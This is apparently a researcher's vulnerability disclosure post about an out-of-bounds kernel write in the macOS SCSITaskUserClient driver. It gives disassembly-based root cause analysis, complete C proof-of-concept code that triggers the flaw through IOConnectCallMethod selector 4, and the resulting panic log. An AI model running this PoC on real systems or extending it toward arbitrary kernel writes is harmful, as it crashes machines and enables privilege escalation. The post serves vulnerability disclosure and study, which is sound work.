---
layout: default
author: juwei lin
date: 2019-01-21 15:34:00 +0800
---

# Apple macOS SCSITaskUserClient Out of Boundary Write 

## Overview
This vulnerability existsd in I/O Kit module SCSITaskUserClient. 

## Root Cause Analysis
In function `SCSITaskUserClient::externalMethod` selector 4, it doesn't check the value of scalarInput[0]. It can be any value assigned from attacker. The value is passed to ReleaseTaskReference directly.

```
mov     rax, [r15+20h]  ; scalarInput
mov     esi, [rax]      ; int
mov     rdi, r12        ; this
call    __ZN18SCSITaskUserClient20ReleaseTaskReferenceEi ; SCSITaskUserClient::ReleaseTaskReference(int)
jmp     loc_1BC4
```

In function `SCSITaskUserClient::ReleaseTaskReference`, it has out-of-boundary write (OOW) issue.
```
; __int64 __fastcall SCSITaskUserClient::ReleaseTaskReference(SCSITaskUserClient *this, int)
public __ZN18SCSITaskUserClient20ReleaseTaskReferenceEi
__ZN18SCSITaskUserClient20ReleaseTaskReferenceEi proc near
push    rbp
mov     rbp, rsp
push    r15
push    r14
push    r13
push    r12
push    rbx
push    rax
mov     r13d, esi
mov     r15, rdi
movsxd  rbx, r13d
mov     edi, 5275011h   ; unsigned __int64
xor     ecx, ecx        ; unsigned __int64
mov     rsi, r15        ; unsigned __int64
mov     rdx, rbx        ; unsigned __int64
call    __ZL19RecordSTUCTimeStampmmmmm ; RecordSTUCTimeStamp(ulong,ulong,ulong,ulong,ulong)
lea     r14, [r15+rbx*4+170h]  ------(a)
xor     edi, edi
mov     esi, 1
mov     rdx, r14
call    _OSCompareAndSwap
```  
At location (a), it uses the value from attacker as an index. Obvisouly, it leads to OOW.

## PoC Code
Please run the PoC with DVD service enabled since I use the `IODVDServices` to get SCSITaskUserClient.  
I run the PoC in my VM fusion.  

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <IOKit/IOKitLib.h>


void trigger(io_connect_t conn)
{
    uint64_t INPUTSCALAR[8];
    uint32_t INPUTSCALARCNT = 1;
    
    char INPUTSTRUCT[4096];
    size_t INPUTSTRUCTCNT = 0;
    
    uint64_t OUTPUTSCALAR[8] = {0};
    uint32_t OUTPUTSCALARCNT = 0;
    
    char OUTPUTSTRUCT[4096];
    size_t OUTPUTSTRUCTCNT = 0;
    
    //FILL INPUT
    INPUTSCALARCNT = 1;
    
    OUTPUTSCALARCNT = 0;
    INPUTSTRUCTCNT = 0;
    OUTPUTSTRUCTCNT = 0;
    
    for (int i=0;i<0x1000;i++) {
        INPUTSCALAR[0] = i * 4;
        
        IOConnectCallMethod(
                            conn,
                            4,
                            INPUTSCALAR,
                            INPUTSCALARCNT,
                            INPUTSTRUCT,
                            INPUTSTRUCTCNT,
                            OUTPUTSCALAR,
                            &OUTPUTSCALARCNT,
                            OUTPUTSTRUCT,
                            &OUTPUTSTRUCTCNT);
    }

    
}


int main(){
    
    kern_return_t err;
    
    CFMutableDictionaryRef Matching = IOServiceMatching("IODVDServices");
    
    if(!Matching){
        
        printf("UNABLE TO CREATE SERVICE MATCHING DICTIONARY\n");
        
        return 0;
        
    }
    
    io_iterator_t iterator;
    
    err = IOServiceGetMatchingServices(kIOMasterPortDefault, Matching, &iterator);
    
    if (err != KERN_SUCCESS){
        
        printf("NO MATCHES\n");
        return 0;
    }
    
    io_service_t service = IOIteratorNext(iterator);
    
    if (service == IO_OBJECT_NULL){
        
        printf("UNABLE TO FIND SERVICE\n");
        
        return 0;
        
    }
    
    io_connect_t CONN = MACH_PORT_NULL;
    
    err = IOServiceOpen(service, mach_task_self(), 12, &CONN);
    
    if (err != KERN_SUCCESS){
        
        printf("UNABLE TO GET USER CLIENT CONNECTION\n");
        
        return 0;
        
    }else{
        
        printf("GOT USERCLIENT CONNECTION: %X, TYPE:%D\n", CONN, 0);
        
    }
    
    trigger(CONN);
    
    printf("PANIC?\n");
    
    return 0;
    
}

```

## Panic Log
```
Anonymous UUID:       039B94D9-F271-8A3F-BAE4-C8BF9D6B5BEE

Mon Jan 21 15:27:57 2019

*** Panic Report ***
panic(cpu 0 caller 0xffffff800d2da1ed): Kernel trap at 0xffffff800d7c2cd6, type 14=page fault, registers:
CR0: 0x000000008001003b, CR2: 0xffffff801c3c1000, CR3: 0x00000000081500f4, CR4: 0x00000000003606e0
RAX: 0x0000000000000000, RBX: 0x0000000000002924, RCX: 0x0000000000000000, RDX: 0xffffff801c3c1000
RSP: 0xffffff887077bab0, RBP: 0xffffff887077bab0, RSI: 0x0000000000000001, RDI: 0x0000000000000000
R8:  0x0000000000000000, R9:  0x0000000000000000, R10: 0xffffff8018122088, R11: 0xffffff800d859080
R12: 0xffffff801c3b6a00, R13: 0x0000000000002924, R14: 0xffffff801c3c1000, R15: 0xffffff801c3b6a00
RFL: 0x0000000000010246, RIP: 0xffffff800d7c2cd6, CS:  0x0000000000000008, SS:  0x0000000000000010
Fault CR2: 0xffffff801c3c1000, Error code: 0x0000000000000002, Fault CPU: 0x0 VMM, PL: 0, VF: 1

Backtrace (CPU 0), Frame : Return Address
0xffffff887077b580 : 0xffffff800d1aeafd mach_kernel : _handle_debugger_trap + 0x48d
0xffffff887077b5d0 : 0xffffff800d2e85a3 mach_kernel : _kdp_i386_trap + 0x153
0xffffff887077b610 : 0xffffff800d2d9fca mach_kernel : _kernel_trap + 0x4fa
0xffffff887077b680 : 0xffffff800d15bca0 mach_kernel : _return_from_trap + 0xe0
0xffffff887077b6a0 : 0xffffff800d1ae517 mach_kernel : _panic_trap_to_debugger + 0x197
0xffffff887077b7c0 : 0xffffff800d1ae363 mach_kernel : _panic + 0x63
0xffffff887077b830 : 0xffffff800d2da1ed mach_kernel : _kernel_trap + 0x71d
0xffffff887077b9a0 : 0xffffff800d15bca0 mach_kernel : _return_from_trap + 0xe0
0xffffff887077b9c0 : 0xffffff800d7c2cd6 mach_kernel : _OSCompareAndSwap + 0x6
0xffffff887077bab0 : 0xffffff7f8f03fa00 com.apple.iokit.SCSITaskUserClient : __ZN18SCSITaskUserClient20ReleaseTaskReferenceEi + 0x40
0xffffff887077baf0 : 0xffffff7f8f03fd41 com.apple.iokit.SCSITaskUserClient : __ZN18SCSITaskUserClient14externalMethodEjP25IOExternalMethodArgumentsP24IOExternalMethodDispatchP8OSObjectPv + 0x241
0xffffff887077bb30 : 0xffffff800d88e91f mach_kernel : _is_io_connect_method + 0x20f
0xffffff887077bc70 : 0xffffff800d294bb4 mach_kernel : _iokit_server_routine + 0x5e84
0xffffff887077bd80 : 0xffffff800d1b42bd mach_kernel : _ipc_kobject_server + 0x12d
0xffffff887077bdd0 : 0xffffff800d18ebe5 mach_kernel : _ipc_kmsg_send + 0x225
0xffffff887077be50 : 0xffffff800d1a359e mach_kernel : _mach_msg_overwrite_trap + 0x38e
0xffffff887077bef0 : 0xffffff800d2c170b mach_kernel : _mach_call_munger64 + 0x22b
0xffffff887077bfa0 : 0xffffff800d15c486 mach_kernel : _hndl_mach_scall64 + 0x16
```

## Q & A

### How did you find this vulnerability?
by fuzzing.

### Can you identify exploitability?
This is a **Out-of-Boundary write** vulnerability. It can write arbitrary kernel memory with value 1.

### Can you identify root cause?
Yes, see the root cause analysis.

### Vulnerable software and hardware
macOS 10.14.2 and all before with DVD service enabled.  
vulnerable module: SCSITaskUserClient